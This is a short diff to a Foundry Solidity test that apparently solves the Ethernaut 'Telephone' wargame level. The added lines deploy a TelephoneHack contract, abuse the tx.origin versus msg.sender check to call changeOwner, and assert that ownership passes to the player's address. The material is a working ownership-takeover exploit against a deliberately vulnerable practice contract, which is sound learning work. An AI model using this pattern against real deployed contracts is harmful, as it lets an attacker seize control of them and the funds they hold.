@@ -59,6 +59,17 @@ contract TelephoneTest is Test {
         Telephone instance = Telephone(payable(instanceAddress));
 
         /* Level Hack */
+        address owner = instance.owner();
+        emit log_named_address("owner", owner);
+        assertEq(owner, address(telephoneFactory));
+
+        // 1. Call Telephone.changeOwner via TelephoneHack to change msg.sender from tx.origin
+        TelephoneHack telephoneHack = new TelephoneHack();
+        telephoneHack.hack(instanceAddress, eoa);
+
+        owner = instance.owner();
+        emit log_named_address("owner", owner);
+        assertEq(owner, address(eoa));
 
         /* Level Submit */
         // Start recording logs to capture level completed log
